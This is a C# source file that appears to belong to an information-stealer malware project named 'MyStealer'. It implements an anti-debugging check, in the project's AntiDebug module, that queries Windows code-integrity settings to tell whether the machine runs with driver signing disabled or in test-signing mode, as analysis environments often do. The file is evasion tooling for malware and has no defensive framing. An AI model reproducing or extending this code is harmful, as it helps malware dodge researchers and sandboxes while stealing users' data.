using System.Runtime.InteropServices;
using static MyStealer.AntiDebug.NativeCalls;

namespace MyStealer.AntiDebug.Check
{
    internal class DriverIntegrity : CheckBase
    {
        public override string Name => "Driver integrity options";

        private const uint SystemCodeIntegrityInformation = 0x67;
        private const uint CODEINTEGRITY_OPTION_ENABLED = 0x01;
        private const uint CODEINTEGRITY_OPTION_TESTSIGN = 0x02;

        public override bool CheckPassive()
        {
            var CodeIntegrityInfo = new SYSTEM_CODEINTEGRITY_INFORMATION
            {
                Length = (uint)Marshal.SizeOf(typeof(SYSTEM_CODEINTEGRITY_INFORMATION))
            };

            NtQuerySystemInformation_CodeIntegrityInfo(SystemCodeIntegrityInformation, ref CodeIntegrityInfo, (uint)Marshal.SizeOf(CodeIntegrityInfo), out var returnLength);

            return returnLength != (uint)Marshal.SizeOf(CodeIntegrityInfo)
                || (CodeIntegrityInfo.CodeIntegrityOptions & CODEINTEGRITY_OPTION_ENABLED) == 0
                || (CodeIntegrityInfo.CodeIntegrityOptions & CODEINTEGRITY_OPTION_TESTSIGN) != 0;
        }
    }
}
